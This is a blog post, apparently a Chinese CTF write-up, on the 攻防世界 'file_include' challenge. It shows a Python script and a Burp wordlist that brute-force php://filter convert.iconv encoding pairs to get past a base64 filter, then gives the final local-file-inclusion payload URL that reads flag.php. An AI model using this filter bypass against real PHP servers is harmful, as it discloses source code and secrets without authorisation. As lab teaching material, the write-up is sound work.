<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>攻防世界(PHP过滤器过滤)file_include - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/16fdb8858e5049cfb923d6d1f1ad5921/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="攻防世界(PHP过滤器过滤)file_include">
  <meta property="og:description" content="转换过滤器官方文档：https://www.php.net/manual/zh/filters.convert.php#filters.convert.iconv
这道题因为convert.base64-encode被过滤掉了，所以使用convert.iconv.*过滤器
在激活 iconv 的前提下可以使用 convert.iconv.* 压缩过滤器， 等同于用 iconv() 处理所有的流数据。 该过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 或 convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; （两种写法的语义都相同）。
直接上脚本爆破出合适的编码：
import requests in_encodings = [&#39;UCS-4*&#39;, &#39;UCS-4BE&#39;, &#39;UCS-4LE*&#39;, &#39;UCS-2&#39;, &#39;UCS-2BE&#39;, &#39;UCS-2LE&#39;, &#39;UTF-32*&#39;, &#39;UTF-32BE*&#39;, &#39;UTF-32LE*&#39;, &#39;UTF-16*&#39;, &#39;UTF-16BE*&#39;, &#39;UTF-16LE*&#39;, &#39;UTF-7&#39;, &#39;UTF7-IMAP&#39;, &#39;UTF-8*&#39;, &#39;ASCII*&#39;, &#39;EUC-JP*&#39;, &#39;SJIS*&#39;, &#39;eucJP-win*&#39;, &#39;SJIS-win*&#39;, &#39;ISO-2022-JP&#39;, &#39;ISO-2022-JP-MS&#39;, &#39;CP932&#39;, &#39;CP51932&#39;, &#39;SJIS-mac&#39;, &#39;SJIS-Mobile#DOCOMO&#39;, &#39;SJIS-Mobile#KDDI&#39;, &#39;SJIS-Mobile#SOFTBANK&#39;, &#39;UTF-8-Mobile#DOCOMO&#39;, &#39;UTF-8-Mobile#KDDI-A&#39;, &#39;UTF-8-Mobile#KDDI-B&#39;, &#39;UTF-8-Mobile#SOFTBANK&#39;, &#39;ISO-2022-JP-MOBILE#KDDI&#39;, &#39;JIS&#39;, &#39;JIS-ms&#39;, &#39;CP50220&#39;, &#39;CP50220raw&#39;, &#39;CP50221&#39;, &#39;CP50222&#39;, &#39;ISO-8859-1*&#39;, &#39;ISO-8859-2*&#39;, &#39;ISO-8859-3*&#39;, &#39;ISO-8859-4*&#39;, &#39;ISO-8859-5*&#39;, &#39;ISO-8859-6*&#39;, &#39;ISO-8859-7*&#39;, &#39;ISO-8859-8*&#39;, &#39;ISO-8859-9*&#39;, &#39;ISO-8859-10*&#39;, &#39;ISO-8859-13*&#39;, &#39;ISO-8859-14*&#39;, &#39;ISO-8859-15*&#39;, &#39;ISO-8859-16*&#39;, &#39;byte2be&#39;, &#39;byte2le&#39;, &#39;byte4be&#39;, &#39;byte4le&#39;, &#39;BASE64&#39;, &#39;HTML-ENTITIES&#39;, &#39;7bit&#39;, &#39;8bit&#39;, &#39;EUC-CN*&#39;, &#39;CP936&#39;, &#39;GB18030&#39;, &#39;HZ&#39;, &#39;EUC-TW*&#39;, &#39;CP950&#39;, &#39;BIG-5*&#39;, &#34;">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-11T11:36:57+08:00">
    <meta property="article:modified_time" content="2024-07-11T11:36:57+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">攻防世界(PHP过滤器过滤)file_include</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="u64118cb4">转换过滤器官方文档：https://www.php.net/manual/zh/filters.convert.php#filters.convert.iconv</p> 
<p id="u24cb6d11"></p> 
<p id="uebbb5b2b">这道题因为convert.base64-encode被过滤掉了，所以使用convert.iconv.*过滤器</p> 
<p id="ua7c79e6b">在激活 <a href="https://www.php.net/manual/zh/book.iconv.php" rel="nofollow" title="iconv">iconv</a> 的前提下可以使用 convert.iconv.* 压缩过滤器， 等同于用 <a href="https://www.php.net/manual/zh/function.iconv.php" rel="nofollow" title="iconv()">iconv()</a> 处理所有的流数据。 该过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 或 convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; （两种写法的语义都相同）。</p> 
<p></p> 
<p id="u64f8693e">直接上脚本爆破出合适的编码：</p> 
<pre id="ejWNQ"><code>import requests

in_encodings = ['UCS-4*', 'UCS-4BE', 'UCS-4LE*', 'UCS-2', 'UCS-2BE', 'UCS-2LE', 'UTF-32*', 'UTF-32BE*', 'UTF-32LE*', 'UTF-16*', 'UTF-16BE*', 'UTF-16LE*', 'UTF-7', 'UTF7-IMAP', 'UTF-8*', 'ASCII*', 'EUC-JP*', 'SJIS*', 'eucJP-win*', 'SJIS-win*', 'ISO-2022-JP', 'ISO-2022-JP-MS', 'CP932', 'CP51932', 'SJIS-mac', 'SJIS-Mobile#DOCOMO', 'SJIS-Mobile#KDDI', 'SJIS-Mobile#SOFTBANK', 'UTF-8-Mobile#DOCOMO', 'UTF-8-Mobile#KDDI-A', 'UTF-8-Mobile#KDDI-B', 'UTF-8-Mobile#SOFTBANK', 'ISO-2022-JP-MOBILE#KDDI', 'JIS', 'JIS-ms', 'CP50220', 'CP50220raw', 'CP50221', 'CP50222', 'ISO-8859-1*', 'ISO-8859-2*', 'ISO-8859-3*', 'ISO-8859-4*', 'ISO-8859-5*', 'ISO-8859-6*', 'ISO-8859-7*', 'ISO-8859-8*', 'ISO-8859-9*', 'ISO-8859-10*', 'ISO-8859-13*', 'ISO-8859-14*', 'ISO-8859-15*', 'ISO-8859-16*', 'byte2be', 'byte2le', 'byte4be', 'byte4le', 'BASE64', 'HTML-ENTITIES', '7bit', '8bit', 'EUC-CN*', 'CP936', 'GB18030', 'HZ', 'EUC-TW*', 'CP950', 'BIG-5*', "CP{949}", "CP{775}"]

out_codings = in_encodings[:]
for inenc in in_encodings:
    for outenc in out_codings:
        url = 'http://61.147.171.105:62135/?filename=php://filter/convert.iconv.{}.{}/resource=flag.php'.format(inenc,outenc)
        res = requests.get(url)
        if "flag" in res.text:
            print("inenc is:{},outenc is:{}".format(inenc,outenc))
            print(res.text)</code></pre> 
<p id="u353943b3"></p> 
<p></p> 
<p id="u3f5baf01">burp爆破用这个字典</p> 
<pre id="ErMNv"><code>UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-mac
SJIS-Mobile#DOCOMO
SJIS-Mobile#KDDI
SJIS-Mobile#SOFTBANK
UTF-8-Mobile#DOCOMO
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-B
UTF-8-Mobile#SOFTBANK
ISO-2022-JP-MOBILE#KDDI
JIS
JIS-ms
CP50220
CP50220raw
CP50221
CP50222
ISO-8859-1*
ISO-8859-2*
ISO-8859-3*
ISO-8859-4*
ISO-8859-5*
ISO-8859-6*
ISO-8859-7*
ISO-8859-8*
ISO-8859-9*
ISO-8859-10*
ISO-8859-13*
ISO-8859-14*
ISO-8859-15*
ISO-8859-16*
byte2be
byte2le
byte4be
byte4le
BASE64
HTML-ENTITIES
7bit
8bit
EUC-CN*
CP936
GB18030
HZ
EUC-TW*
CP950
BIG-5*
EUC-KR*
UHC
ISO-2022-KR
Windows-1251
Windows-1252
CP866
KOI8-R*
KOI8-U*
ArmSCII-8
</code></pre> 
<p id="u439948df"></p> 
<p id="u98943c40">选集束炸弹模式，我这里没有爆破完已经出来能用的了<img alt="" height="950" src="https://images2.imgbox.com/d9/69/oQyNoCuo_o.png" width="1200"></p> 
<p></p> 
<p id="uf8b8030b">dirsearch扫出还有个flag.php，flag应该就在这里面<img alt="" height="97" src="https://images2.imgbox.com/f7/94/DjzLw3Md_o.png" width="670"></p> 
<p id="u03a5868a">构造payload：</p> 
<p id="u73c08344"><a href="http://61.147.171.105:62135?filename=php://filter/convert.iconv.UTF-8*.UTF-32*/resource=flag.php" rel="nofollow" title="http://61.147.171.105:62135?filename=php://filter/convert.iconv.UTF-8*.UTF-32*/resource=flag.php">http://61.147.171.105:62135?filename=php://filter/convert.iconv.UTF-8*.UTF-32*/resource=flag.php</a></p> 
<p><img alt="" height="878" src="https://images2.imgbox.com/a2/d3/q5Z1eStm_o.png" width="1200"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/872599b8de08fd6373adabffb147d133/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">大数据基础：Hadoop之Yarn重点架构原理</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/bbe372801115dd8bc34f601ebb6b0fc8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【完结】LeetCode 热题 HOT 100分类&#43;题解&#43;代码详尽指南</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>